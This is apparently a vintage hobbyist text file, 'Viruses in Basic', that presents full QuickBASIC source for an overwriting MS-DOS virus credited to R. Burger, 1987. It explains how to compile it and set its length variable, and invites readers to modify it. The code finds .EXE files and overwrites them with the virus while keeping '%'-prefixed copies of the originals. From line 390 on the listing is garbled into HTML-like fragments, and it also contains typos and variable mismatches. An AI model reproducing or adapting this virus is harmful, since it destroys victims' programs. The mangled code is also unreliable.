

                           Viruses in Basic
                           ----------------


Basic is great language and often people think of it as a limited language
and will not be of any use in creating something like a virus. Well you are
really wrong. Lets take a look at a Basic Virus created by R. Burger in 1987.
This program is an overwritting virus and uses (Shell) MS-DOS to infect .EXE
files.To do this you must compile the source code using a the Microsoft 
Quick-BASIC.Note the lenght of the compiled and the linked .EXE file and edit
the source code to place the lenght of the object program in the LENGHTVIR
variable. BV3.EXE should be in the current directory, COMMAND.COM must be
available, the LENGHTVIR variable must be set to the lenght of the linked      

program and remember to use /e parameter when compiling.



10 REM ** DEMO  
20 REM ** MODIFY IT YOUR OWN WAY IF DESIRED **
30 REM ** BASIC DOESNT SUCK 
40 REM ** NO KIDDING
50 ON ERROR GOTO 670
60 REM *** LENGHTVIR MUST BE SET **
70 REM *** TO THE LENGHT TO THE **
80 REM *** LINKED PROGRAM ***
90 LENGHTVIR=2641
100 VIRROOT$="BV3.EXE"
110 REM *** WRITE THE DIRECTORY IN THE FILE "INH"
130 SHELL "DIR *.EXE>INH"
140 REM ** OPEN "INH" FILE AND READ NAMES **
150 OPEN "R",1,"INH",32000 
160 GET #1,1
170 LINE INPUT#1,ORIGINAL$
180 LINE INPUT#1,ORIGINAL$
190 LINE INPUT#1,ORIGINAL$
200 LINE INPUT#1,ORIGINAL$  
210 ON ERROR GOT 670
220 CLOSE#2
230 F=1:LINE INPUT#1,ORIGINAL$
240 REM ** "%" IS THE MARKER OF THE BV3
250 REM ** "%" IN THE NAME MEANS
260 REM  ** INFECTED COPY PRESENT 
270 IF MID$(ORIGINAL$,1,1)="%" THEN GOTO 210
280 ORIGINAL$=MID$(ORIGINAL$,1,13)
290 EXTENSIONS$=MID$(ORIGINAL,9,13)
300 MID$(EXTENSIONS$,1,1)="."
310 REM *** CONCATENATE NAMES INTO FILENAMES **
320 F=F+1
330 IF MID$(ORIGINAL$,F,1)=" " OR MID$ (ORIGINAL$,F,1)="." OR F=13 THEN      
GOTO 350
340 GOTO 320
350 ORIGINAL$=MID$(ORIGINAL$,1,F-1)+EXTENSION$
360 ON ERROR GOTO 210
365 TEST$=""
370 REM ++ OPEN FILE FOUND +++
380 OPEN "R",2,OROGINAL$,LENGHTVIR
390 IF LOF(2) < lenghtvir="" then="" goto="" 420="" 400="" get="" #2,2="" 410="" line="" input#1,test$="" 420="" close#2="" 431="" rem="" ++="" check="" if="" program="" is="" ill="" ++="" 440="" rem="" ++="" "%"="" at="" the="" end="" of="" the="" file="" means..="" 450="" rem="" ++="" file="" is="" already="" sick="" ++="" 460="" rem="" if="" mid$(test,2,1)="%" then="" goto="" 210="" 470="" close#1="" 480="" originals$="ORIGINAL$" 490="" mid$(originals$,1,1)="%" 499="" rem="" ++++="" sane="" "healthy"="" program="" ++++="" 510="" c$="COPY " +original$+"="" "+originals$="" 520="" shell="" c$="" 530="" rem="" ***="" copy="" virus="" to="" healthy="" program="" ****="" 540="" c$="COPY " +virroot$+original$="" 550="" shell="" c$="" 560="" rem="" ***="" append="" virus="" marker="" ***="" 570="" open="" original$="" for="" append="" as="" #1="" len="13" 580="" write#1,originals$="" 590="" close#1="" 630="" rem="" ++="" ouyput="" message="" ++="" 640="" print="" "infection="" in="" "="" ;origianal$;="" "="" !!="" be="" ware="" !!"="" 650="" system="" 660="" rem="" **="" virus="" error="" message="" 670="" print="" "virus="" internal="" error="" gottcha="" !!!!":system="" 680="" end="" this="" basic="" virus="" will="" only="" attack="" .exe="" files.="" after="" the="" execution="" you="" will="" see="" a="" "inh"="" file="" which="" contains="" the="" directory,="" and="" the="" file="" %sort.exe.="" programs="" which="" start="" with="" "%"="" are="" not="" infected="" ,they="" pose="" as="" back="" up="" copies.="" ="">